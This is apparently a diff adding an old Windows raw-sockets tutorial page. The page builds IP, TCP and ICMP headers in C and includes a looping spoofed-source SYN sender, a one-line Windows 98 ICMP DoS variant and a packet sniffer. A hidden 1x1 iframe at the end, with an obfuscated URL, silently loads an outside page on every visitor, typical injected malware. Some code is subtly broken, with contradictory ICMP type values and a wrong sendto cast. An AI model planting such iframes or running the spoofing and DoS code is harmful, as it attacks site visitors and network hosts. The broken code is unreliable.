+Before we used to set its type as SOCK_STREAM or SOCK_DGRAM for TCP
+and UDP respectively. In raw sockets however we will set the type
+parameter to SOCK_RAW and the protocol to IPPROTO_RAW.
+
+A Raw Socket looks like this:
+
+socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+So thats how we tell the winsock that its a raw socket that we will
+be using which still leaves the question how do we build the actual
+header?
+
+
+5.0 BUILDING HEADERS IN CODE
+=======================================
+
+The Headers are built using normal C structures, we declare a struct
+for each header we want to build and declare a variable for each field
+of the Header that we will be using.
+
+While creating the structure we must remember that there are certain
+expectations and limitations on the size of Headers, an IP Header is
+20 Bytes in size, so we will have to use certain types of variables
+to reflect the sizes of these fields the different variable types and
+there sizes are as follows:
+
+unsigned char 		= 1 byte  (8 bits)
+unsigned short int 	= 2 bytes (16 bits)
+unsigned int 		= 4 bytes (32 bits)
+
+
+5.1 THE IP HEADER
+=======================================
+
+The IP Header as explained above will be built using a structure
+containing all of the fields in the IP Header. As you will remember
+there are 14 fields in the IP Header, however we will not be using
+any of the IP's Options or the padding, also in our examples we will
+only be using single Datagrams so there will be no need for fragmenting
+the packets so we will not be using the flags field and we will just
+set the Fragment Offset to 0.
+
+So with a total of 14 fields in the IP Header we will not be using 3
+of them so that leaves us with 11 fields, also we will be storing the
+Ip version and length in one variable so that means we will be using
+a total of 10 variables for our code when building the Header.
+
+
+Well here is the structure we will be using to build the IP Header:
+
+
+typedef struct ip_hdr
+{
+    unsigned char  ip_verlen;        // version & IHL		 =>	  1 Bytes  (combined size of both)
+    unsigned char  ip_tos;           // TOS			 =>	  1 Bytes
+    unsigned short ip_totallength;   // Total length		 =>	  2 Bytes
+    unsigned short ip_id;            // Identification	 	 =>	  2 Bytes
+    unsigned short ip_offset;        // Fragment Offset		 =>	  2 Bytes
+    unsigned char  ip_ttl;           // Time to live		 =>	  1 Bytes
+    unsigned char  ip_protocol;      // Protocol		 =>	  1 Bytes
+    unsigned short ip_checksum;      // Header checksum		 =>	  2 Bytes
+    unsigned int   ip_srcaddr;       // Source address		 => 	  4 Bytes
+    unsigned int   ip_destaddr;      // Destination address	 =>    +  4 Bytes
+				     //				       = 20 Bytes
+}IP_HDR; 
+
+
+This structure contains all of the fields we will be using and the sizes
+of the variables add up to 20 Bytes, the correct size of an IP Header,
+note however that the Fragment Offset field is given a value of 2 Bytes
+which is equal to 16 bits, the true size of the frag offset is 13 but we
+altered it here to make up for the missing 3 bits of the flag field but
+it wont make any difference to the packet this is still a perfectly formed
+IP Header.
+
+
+5.2 THE TCP HEADER
+=======================================
+
+With the below structure you will again notice that there are a few
+of the TCP Headers fields missing, again Options and Padding are not
+included as we will not be using them, that leaves us with a total of
+10 fields and the reserved field has been left out because it is not
+currently implemented by TCP so we are left with 9 fields to fill.
+
+With the missing fields of the Header we have increased the sizes of
+the Control Bits and Data Offset fields both to 1 Byte to make up the
+20 Byte size of the TCP Header.
+
+So here is the TCP Structure:
+
+
+typedef struct tcp_hdr
+{
+    unsigned short sport;	     // Source Port		 =>	  2 Bytes
+    unsigned short dport;	     // Destination Port	 =>	  2 Bytes
+    unsigned int   seqnum;	     // Sequence Number		 =>	  4 Bytes
+    unsigned int   acknum;	     // Acknowledgement Number   =>	  4 Bytes
+    unsigned char  DataOffset;	     // Data Offset		 =>	  1 Bytes
+    unsigned char  Flags;	     // Control Bits		 =>	  1 Bytes
+    unsigned short Windows;	     // Window			 =>	  2 Bytes
+    unsigned short Checksum; 	     // Checksum		 =>	  2 Bytes
+    unsigned short UrgPointer;       // Urgent Pointer		 =>    +  2 Bytes
+				     //				       = 20 Bytes
+}TCP_HDR;
+
+
+5.3 THE UDP HEADER
+=======================================
+
+The below structure is the UDP Header, unlike previous headers it is
+not missing any fields and adds up to a totalsize of 8 Bytes.
+
+
+typedef struct udp_hdr
+{
+    unsigned short sport;	     // Source Port		 =>	  2 Bytes
+    unsigned short dport;	     // Destination Port	 =>	  2 Bytes
+    unsigned short Length; 	     // Length			 =>	  2 Bytes
+    unsigned short Checksum;	     // Checksum		 =>    +  2 Bytes
+				     //				       =  8 Bytes
+}UDP_HDR;
+
+
+5.4 THE ICMP HEADER
+=======================================
+
+The ICMP Header is similiar to the UDP Header, it has very few fields
+and it adds up to a size of 8 Bytes.
+
+
+typedef struct tagICMPHDR
+{ 
+    unsigned char  icmp_type;	     // Type of message		 =>	  1 Bytes
+    unsigned char  icmp_code;        // Type sub code		 =>	  1 Bytes
+    unsigned short icmp_cksum;       // Checksum		 =>	  2 Bytes	
+    unsigned short icmp_id;          // Identifer		 =>	  2 Bytes
+    unsigned short icmp_seq;         // sequence number		 =>	+ 2 Bytes
+				     //					= 8 Bytes
+} ICMPHDR, *PICMPHDR;
+
+
+5.5 THE PSUEDO HEADER
+=======================================
+
+The Psuedo Header is used to protect against misrouted segments,
+its size is 12 Bytes, the following structure forms the Psuedo
+Header:
+
+
+typedef struct ps_hdr
+{
+    unsigned int   source_address;   // Source Address		 =>	  4 Bytes
+    unsigned int   dest_address;     // Destination Address	 =>	  4 Bytes
+    unsigned char  placeholder;	     // Place Holder		 =>	  1 Bytes
+    unsigned char  protocol;	     // Protocol		 =>	  1 Bytes
+    unsigned short tcp_length;	     // TCP Length		 =>    +  2 Bytes
+				     //				       = 12 Bytes
+    struct tcp_hdr tcp;
+
+}PS_HDR;
+
+
+5.6 THE CHECKSUM FUNCTION
+=======================================
+
+The Checksum Function is needed to calculate the size of the
+packet, here is the functions code:
+
+
+USHORT checksum(USHORT *buffer, int size)
+{
+    unsigned long cksum=0;
+    while (size > 1)
+    {
+        cksum += *buffer++;
+        size  -= sizeof(USHORT);   
+    }
+    if (size)
+    {
+        cksum += *(UCHAR*)buffer;   
+    }
+    cksum = (cksum >> 16) + (cksum & 0xffff);
+    cksum += (cksum >>16); 
+    return (USHORT)(~cksum); 
+}
+
+
+
+6.0 SOURCE CODE
+=======================================
+
+Well in the Source Code we are first going to look at code which is
+supported by all Winsock 2 Systems including Win 9x ones so that
+every-1 can av' a go as it were. So in this section we are going to
+put what weve learned so far together and create a working internet
+application by using the icmp protocol to send an ICMP Echo Request
+message, the first part of a ping program. First tough we are going
+to create a header ".h" file for the application, the file contains
+the checksum function and structures for the IP and ICMP headers.
+
+Remember you will have to make sure that the header file is included
+correctly with the source file and that you linked to Ws2_32.lib.
+
+6.1 ICMP ECHO REQUEST
+=======================================
+
+
+/********************* icmp.h header file ************************/
+
+// ICMP message types
+#define ICMP_ECHOREQ		13	// Echo request query
+
+
+// IP Header
+typedef struct ip_hdr
+{
+    unsigned char  ip_verlen;        // version & IHL		 =>	  1 Bytes  (combined size of both)
+    unsigned char  ip_tos;           // TOS			 =>	  1 Bytes
+    unsigned short ip_totallength;   // Total length		 =>	  2 Bytes
+    unsigned short ip_id;            // Identification	 	 =>	  2 Bytes
+    unsigned short ip_offset;        // Fragment Offset		 =>	  2 Bytes
+    unsigned char  ip_ttl;           // Time to live		 =>	  1 Bytes
+    unsigned char  ip_protocol;      // Protocol		 =>	  1 Bytes
+    unsigned short ip_checksum;      // Header checksum		 =>	  2 Bytes
+    unsigned int   ip_srcaddr;       // Source address		 => 	  4 Bytes
+    unsigned int   ip_destaddr;      // Destination address	 =>    +  4 Bytes
+				     //				       = 20 Bytes
+}IP_HDR; 
+
+
+// ICMP Header
+typedef struct tagICMPHDR
+{ 
+    unsigned char  icmp_type;	     // Type of message		 =>	  1 Bytes
+    unsigned char  icmp_code;        // Type sub code		 =>	  1 Bytes
+    unsigned short icmp_cksum;       // Checksum		 =>	  2 Bytes	
+    unsigned short icmp_id;          // Identifer		 =>	  2 Bytes
+    unsigned short icmp_seq;         // sequence number		 =>	+ 2 Bytes
+				     //					= 8 Bytes
+} ICMPHDR, *PICMPHDR;
+
+
+#define REQ_DATASIZE 32		// Echo Request Data size
+
+
+// ICMP Echo Request
+typedef struct tagECHOREQUEST
+{
+    ICMPHDR icmpHdr;
+    char    cData[REQ_DATASIZE];
+
+} ECHOREQUEST, *PECHOREQUEST;
+
+
+USHORT checksum(USHORT *buffer, int size)
+{
+    unsigned long cksum=0;
+    while (size > 1)
+    {
+        cksum += *buffer++;
+        size  -= sizeof(USHORT);   
+    }
+    if (size)
+    {
+        cksum += *(UCHAR*)buffer;   
+    }
+    cksum = (cksum >> 16) + (cksum & 0xffff);
+    cksum += (cksum >>16); 
+    return (USHORT)(~cksum); 
+}
+
+/********************* icmp.h header file ************************/
+
+
+So in the header file we first #defined some code type for ICMP
+Echo Request to make things a bit more readable later on, then we
+set up our IP and ICMP structures by giving variables for each field
+in the Protocol headers. Notice the sizes of each field add up
+correctly for the sizes of the protocol headers, we also have a
+structure called ECHOREQUEST, all icmp messages have different
+fields except for the common ones defined in the icmp header above,
+the fields of ECHOREQUEST are the extra fields nedded for echo's.
+We then have a function to calculate the checksum, all these bits
+of code are just placed inside our .h file to keep things shorter
+and more readable in the main program, speaking of which...
+
+/********************* icmp.c source file ************************/
+
+// Make sure you always include your headers and link your libraries :)
+
+#include &lt;winsock2.h&gt;
+#include &lt;ws2tcpip.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include "icmp.h"
+
+
+void main(int argc, char **argv)
+{
+
+    DWORD dip = inet_addr(argv[1]);
+
+    WSADATA		wsaData;
+    SOCKET		sock;
+
+    static ECHOREQUEST	echo_req;
+
+    struct sockaddr_in sin;
+
+    // Startup WinSock
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
+    {
+	printf("WSAStartup failure!");
+    }
+
+    // Create a raw socket
+    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == SOCKET_ERROR)
+    {
+        printf("Error starting socket");
+    }
+
+    sin.sin_family	= AF_INET;
+    sin.sin_port	= htons(0);
+    sin.sin_addr.s_addr = dip;
+
+
+    // Fill in echo request
+    echo_req.icmpHdr.icmp_type	= ICMP_ECHOREQ;
+    echo_req.icmpHdr.icmp_code	= 0;
+    echo_req.icmpHdr.icmp_cksum	= 0;
+    echo_req.icmpHdr.icmp_id	= 1;
+    echo_req.icmpHdr.icmp_seq	= 1;
+
+    // Fill in some data to send
+    memset(echo_req.cData, ' ', REQ_DATASIZE);
+
+    // Compute checksum
+    echo_req.icmpHdr.icmp_cksum = checksum((unsigned short *)&echo_req, sizeof(ECHOREQUEST));
+	
+    // Status mesage
+    printf("Sending Echo Request to <%s>.\n", argv[1]);
+
+    // Send the echo request  								  
+    if (sendto(sock, (const char *) &echo_req, sizeof(ECHOREQUEST), 0, (SOCKADDR *) dip, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
+    {
+       printf("sendto() failed: %d\n", WSAGetLastError());
+       return -1;
+    }
+
+
+    // Status mesage
+    printf("Message Sent\n");
+
+    // Close socket and WinSock
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}
+
+/********************* icmp.c source file ************************/
+
+Well start up your compiler and link to the Ws2_32.lib file then
+add the icmp.c and icmp.h files to a new project. Compile and run
+this program by typing icmp 127.0.0.1 at the command line. The
+program takes the argument passed to it, 127.0.0.1 or any other
+IP Address you want and sends an ICMP message with a type of 13 and
+a code of 0, this setting is an ICMP echo request. Now remember
+that whatever values you enter in the code for the ICMP headers
+fields, that is the type of ICMP Message that is sent. For example,
+if we were to change the type to 17 then we would be sending a ICMP
+Netmask request, the target machine would then send back a Netmask
+Reply which we could use to map a target network. Or say if we went
+to www.tlsecurity.com and browsed for vulnerabilities and the words
+ICMP and Win98 were to catch our eye, here we would find a
+vulnerability for Windows 98 called p-smash. Now this advisory
+tells us that if we sent an icmp message to a computer running
+Windows 98 that had a Type of 9 and a code of 0 then the thing
+halt and stop responding. Therefore all we have to do with the
+above program is change:
+
+#define ICMP_ECHOREQ		13
+
+	to
+
+#define ICMP_ECHOREQ		19
+
+in the header file, then when we send this to a Windows 98 machine
+the thing halts, an icmp DoS tool.
+
+Lamer Alert: I was using the above as an example DoS tools are
+indeed very lame!! and just shouldn't be used or designed, advisories
+are of course a good thing, they prompt vendors to do something about
+security vulnerabilities and promote security awareness, don't be
+lame, don't use DoS tools, otherwise you'll give Steve Gibson more
+stuff to prattle on about and ill have to bore ya to death with more
+flaming of 'the prick' (yes by flaming of the prick i am refering to
+Giving out about Gibson not medical conditions, I know what you were
+thinking cyberwolf!).
+
+
+6.2 TCP ACK PACKET
+=======================================
+
+/*********************** ip.h header file *************************/
+
+#include &lt;winsock2.h&gt
+#include &lt;windows.h&gt
+#include &lt;ws2tcpip.h&gt
+#include &lt;stdio.h&gt
+
+struct tcpheader {
+ unsigned short int th_sport;
+ unsigned short int th_dport;
+ unsigned int th_seq;
+ unsigned int th_ack;
+ unsigned char th_x2:4, th_off:4;
+ unsigned char th_flags;
+ unsigned short int th_win;
+ unsigned short int th_sum;
+ unsigned short int th_urp;
+}; /* total tcp header length: 20 bytes (=160 bits) */
+
+struct ipheader {
+ unsigned char ip_hl:4, ip_v:4; /* this means that each member is 4 bits */
+ unsigned char ip_tos;
+ unsigned short int ip_len;
+ unsigned short int ip_id;
+ unsigned short int ip_off;
+ unsigned char ip_ttl;
+ unsigned char ip_p;
+ unsigned short int ip_sum;
+ unsigned int ip_src;
+ unsigned int ip_dst;
+}; /* total ip header length: 20 bytes (=160 bits) */
+
+// Psuedo Header
+
+typedef struct ps_hdr
+{
+    unsigned int   source_address;   // Source Address		 =>	  4 Bytes
+    unsigned int   dest_address;     // Destination Address	 =>	  4 Bytes
+    unsigned char  placeholder;	     // Place Holder		 =>	  1 Bytes
+    unsigned char  protocol;	     // Protocol		 =>	  1 Bytes
+    unsigned short tcp_length;	     // TCP Length		 =>    +  2 Bytes
+				     //				       = 12 Bytes
+    struct tcpheader tcp;
+
+}PS_HDR;
+
+// IP/TCP/UDP Checksum Function
+
+USHORT checksum(USHORT *buffer, int size)
+{
+    unsigned long cksum=0;
+    while (size > 1)
+    {
+        cksum += *buffer++;
+        size  -= sizeof(USHORT);   
+    }
+    if (size)
+    {
+        cksum += *(UCHAR*)buffer;   
+    }
+    cksum = (cksum >> 16) + (cksum & 0xffff);
+    cksum += (cksum >>16); 
+    return (USHORT)(~cksum); 
+}
+
+/*********************** ip.h header file *************************/
+
+Well that header file contained a few #define's, these dealt with
+TCP's control bits like ack and sequence and so on to make things
+more readable later. We then setup up the structures for the IP,
+TCP and Psuedo Headers and the function to calculate the checksum.
+Now lets put the header to use with the ack program, this program
+will send a single ACK packet to whatever computer you specify.
+
+/********************** main.c source file ************************/
+
+#include "ip.h"
+
+#define PORT 25
+
+int main (void)
+{
+
+	WSADATA wsd;
+	char datagram[4096];
+	bool bOpt = 1;
+
+    if (WSAStartup(MAKEWORD(2,2), &wsd) != 0)
+    {
+	   printf("WSAStartup() failed: %d\n", GetLastError());
+	   return -1;
+    }
+
+// Create a raw socket
+
+    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (s == INVALID_SOCKET)
+    {
+       printf("WSASocket() failed: %d\n", WSAGetLastError());
+       return -1;
+    }
+
+  struct ipheader *iph = (struct ipheader *) datagram;
+  struct tcpheader *tcph = (struct tcpheader *) datagram + sizeof (struct ipheader);
+  struct sockaddr_in sin;
+
+  PS_HDR pseudo_header;
+
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons (PORT);
+  sin.sin_addr.s_addr = inet_addr ("127.0.0.1");
+
+  memset (datagram, 0, 4096);	/* zero out the buffer */
+
+  iph->ip_hl		 = 5;
+  iph->ip_v			 = 4;
+  iph->ip_tos		 = 0;
+  iph->ip_len		 = sizeof (struct ipheader) + sizeof (struct tcpheader);
+  iph->ip_id		 = 1;
+  iph->ip_off		 = 0;
+  iph->ip_ttl		 = 255;
+  iph->ip_p			 = 6;
+  iph->ip_sum		 = 0;
+  iph->ip_src		 = inet_addr ("1.2.3.4");
+  iph->ip_dst		 = sin.sin_addr.s_addr;
+
+  tcph->th_sport	 = htons (1234);
+  tcph->th_dport	 = htons (PORT);
+  tcph->th_seq		 = rand();
+  tcph->th_ack		 = 0;
+  tcph->th_x2		 = 0;
+  tcph->th_off		 = 0;
+  tcph->th_flags	 = 2; // SYN
+  tcph->th_win		 = htons(65535);
+  tcph->th_sum		 = 0;
+  tcph->th_urp		 = 0;
+
+  // Build the Psuedo Header
+
+  pseudo_header.source_address    = inet_addr ("1.2.3.4");
+  pseudo_header.dest_address	  = sin.sin_addr.s_addr;
+  pseudo_header.placeholder		  = 0;
+  pseudo_header.protocol		  = IPPROTO_TCP;
+  pseudo_header.tcp_length		  = htons(sizeof(tcpheader));
+
+// Calculate Checksum
+
+  tcph->th_sum = checksum((unsigned short *)&pseudo_header, sizeof(pseudo_header));
+  iph->ip_sum  = checksum((unsigned short *)&iph, sizeof(ipheader));
+// ENABLE IPHDRINCL 
+
+    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt)) == SOCKET_ERROR)
+    {
+	   printf("setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
+	   return -1;
+    }
+
+  while (1)
+    {
+      // Send The Packet
+
+    if (sendto(s, datagram, sizeof(datagram), 0, (SOCKADDR *)&sin, sizeof(sin)) == SOCKET_ERROR)
+    {
+       	   printf("sendto() failed: %d\n", WSAGetLastError());
+	   return -1;
+    }
+    }
+
+  return 0;
+}
+
+/********************** main.c source file ************************/
+
+This program sends a tcp SYN packet to a target (you), it is a simple
+program but a very powerful one. You can edit all of the header fields
+enabling us to spoof our ip address amongst other things.
+
+Notice that we can also set the port numbers, some firewalls will
+let a packet with a port of 53 trough and not even log it, by knowing
+security tid bits like this we can build better more sophisticated
+programs.
+
+
+7.0 RECIEVING RAW PACKETS
+=======================================
+
+Recieving Raw Packets was never dealt with in the Berkeley Raw Socket
+specification, so far only linux 2.2.3 and up I believe ever dealt
+with them, it is of course therefore surprising that Microsoft has
+indeed supported a way to recieve raw packets with our programs! Yes
+indeed I am starting to like the guy who came up with the idea of
+supporting raw sockets in Windows more and more! But how do we do it?
+Well what we do is this: sniff all incomming packets on our computer
+and filter them for the packet we are looking for. This method can
+be used for, obviously, creating a packet sniffer and also for a
+firewall or some port redirection tool. Very good idea.
+
+We do it by creating a new raw socket and binding it to the interface,
+go into promiscuous mode and grab all the incomming packets.
+
+As usual we would set up our socket with something like the following:
+
+    SOCKET        sniffsock;
+    SOCKADDR_IN   if0;
+
+
+    sniffsock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
+
+
+and then call bind() with this raw socket:
+
+
+    bind(sniffsock, (SOCKADDR *)&if0, sizeof(if0));
+
+
+we then go into Promiscuous mode and recieve all of the packets by
+calling WSAIoctl() with SIO_RCVALL set:
+
+
+   WSAIoctl(sniffsock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL,	NULL);
+
+
+we can then use the WSARecv() function to grab the packets and feed
+them into a buffer like so:
+
+
+   recv(sniffsock, RecvBuf, sizeof(RecvBuf), 0);
+
+
+We then use our own filterpacket() function to look for the particular
+packet that we want.
+
+
+So now for some example source code, this program will capture all packets
+sent to your computer for as long as the program is running, to do this well
+use a while loop to capture the packets then pass the packet to a function
+called filterpacket() in order to get the information from the packets
+headers. First create a new project and add a .cpp c++ source file.
+Here comes the science bit.
+
+
+/********************** recv.c source file ************************/
+
+#include &lt;winsock2.h&gt
+#include &lt;windows.h&gt
+#include &lt;ws2tcpip.h&gt
+#include &lt;stdio.h&gt
+
+void outtie(char *p)
+{
+	FILE *fp = fopen("Sniffer1.txt","a+");
+	fprintf(fp,"%s\n",p);
+	fclose(fp);
+}
+
+#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)
+#define MAX_ADDR_LEN 16
+#define MAX_HOSTNAME_LAN 255
+
+typedef struct _iphdr
+{
+unsigned char	h_lenver;
+unsigned char	tos;
+unsigned short	total_len;
+unsigned short	ident;
+unsigned short	frag_and_flags;
+unsigned char	ttl;
+unsigned char	proto;
+unsigned short	checksum;
+unsigned int	sourceIP;
+unsigned int	destIP;
+}IP_HDR;
+
+void RecvPacket();
+int filterpacket(char *buf);
+
+char     output[500];
+
+void main()
+{
+RecvPacket();
+}
+
+void RecvPacket()
+{
+    SOCKET        sock;
+    WSADATA       wsd;
+    char RecvBuf[65535] = {0};
+	DWORD		  dwBytesRet;
+	unsigned int  optval = 1;
+
+	WSAStartup(MAKEWORD(2,1),&wsd);
+
+	sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
+
+	char FAR name[MAX_HOSTNAME_LAN];
+	gethostname(name, MAX_HOSTNAME_LAN);
+
+	struct hostent FAR * pHostent;
+	pHostent = (struct hostent * )malloc(sizeof(struct hostent));
+	pHostent = gethostbyname(name);
+
+	SOCKADDR_IN sa;
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(6000);
+
+	memcpy(&sa.sin_addr.S_un.S_addr, pHostent->h_addr_list[0], pHostent->h_length);
+
+	bind(sock, (SOCKADDR *)&sa, sizeof(sa));
+
+	WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL, NULL);
+
+	while (1)
+    {
+    memset(RecvBuf, 0, sizeof(RecvBuf));
+
+	recv(sock, RecvBuf, sizeof(RecvBuf), 0);
+
+	filterpacket(RecvBuf);
+    }
+
+}
+
+
+// Filter the Packet
+
+int filterpacket(char *buf)
+{
+IP_HDR *pIpheader;
+
+char szSourceIP[MAX_ADDR_LEN], szDestIP[MAX_ADDR_LEN];
+SOCKADDR_IN saSource, saDest;
+
+int iProtocol, iTTL;
+
+pIpheader = (IP_HDR *)buf;
+
+//Check Proto
+iProtocol = pIpheader->proto;
+
+if(iProtocol==IPPROTO_TCP)
+{
+	sprintf(output,"Protocol is TCP");
+	outtie(output);
+}
+if(iProtocol==IPPROTO_UDP)
+{
+	sprintf(output,"Protocol is UDP");
+	outtie(output);
+}
+if(iProtocol==IPPROTO_ICMP)
+{
+	sprintf(output,"Protocol is ICMP");
+	outtie(output);
+}
+
+//Check Source IP
+saSource.sin_addr.s_addr = pIpheader->sourceIP;
+strncpy(szSourceIP, inet_ntoa(saSource.sin_addr), MAX_ADDR_LEN);
+
+
+//Check Dest IP
+saDest.sin_addr.s_addr = pIpheader->destIP;
+strncpy(szDestIP, inet_ntoa(saDest.sin_addr), MAX_ADDR_LEN);
+
+
+iTTL = pIpheader->ttl;
+
+//Output
+sprintf(output,"%s->%s", szSourceIP, szDestIP);
+outtie(output);
+
+sprintf(output,"TTL=%d", iTTL);
+outtie(output);
+
+printf("\n");
+return true;
+}
+
+/********************** recv.c source file ************************/
+
+As i said this program will simply capture all packets sent to your
+machine, it will then output their details to a file called Sniffer.txt
+in the same directory as the program, as long as the program is running
+the window will remain black but it is still outputting the information.
+
+To enhance this program you could check the value of pIpheader->proto
+field and add code to handle the underlying tcp header or just format
+the output better.
+
+You will notice the line #define SIO_RCVALL _WSAIOW(IOC_VENDOR,1) at the
+top of the file, this must be defined in all programs that capture packets,
+not sure why it wasn't just defined in one of the standard header files
+but what can we do.
+
+You could use this and the previous program in unison to send a packet
+and recv, checking received packets header fields to match values you
+sent out, working the two together to build up a more complex program.
+
+
+8.0 Last Words.
+=======================================
+
+With a tear in my eye its time unfortunately, to go. I hope you enjoyed
+this final tutorial in the series and learnt alot from the series as a
+whole and I hope you go on to  apply the knowledge you have learned from
+this tutorial and from source code and create some great security
+applications, maybe you can put all of the knowledge you have together
+to create something good and now with an understanding of protocols and
+how to implement them trough code you can review some security features
+on the internet and create some excellent new programs. So I leave you
+now with my TOP 5 suggestions to use your new knowledge, seperately or
+in unison.
+
+1. A stealth port scanner, sending ACK packets and listening for the
+packets returned to find out if the port is open (A SYN packet) closed
+(A RST Packet) or filtered (ICMP Blocked message).
+
+2. OS Fingerprinting, filtering the packets sent by a computer to your
+own to identify the operating system in use.
+
+3. Packet capturing, dumping the packets you sniff to a text file to
+examine them and learn protocols like icq or napster.
+
+4. Stealth Communication, sending data in ICMP or ACK packets so there
+not found by firewalls.
+
+5. Build a firewall, filter the recieved packets to watch for signs of
+attack or system penetration (sounds kinky :P).
+
+
+Now you could even alter existing programs to add new features, send
+packets on ports 53 or 81 to bypass firewalls like checkpoint. OS
+finger print recieved packets to uncover firewall tricks like spoofing
+the source ip of the target your trying to get to, any many other
+things to aid in system security, or insecurity.
+
+
+[ SHOUTS! ]
+
+Starman_Jones		- Thanks for everything over the years (especially for my own room).
+
+Vsus			- I am never drinking Tsambuca with you again :P.
+
+Delusive			- Delusive's breasts owns j00!!!!
+
+BSRF			- Thanks to every-1 at BSRF for releasing this and for being a good laugh :).
+
+secure@microsoft.com	- The things you poor people must have to go trough.
+
+Greg from microsoft	- Your a better man than I.
+
+
+</PRE>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
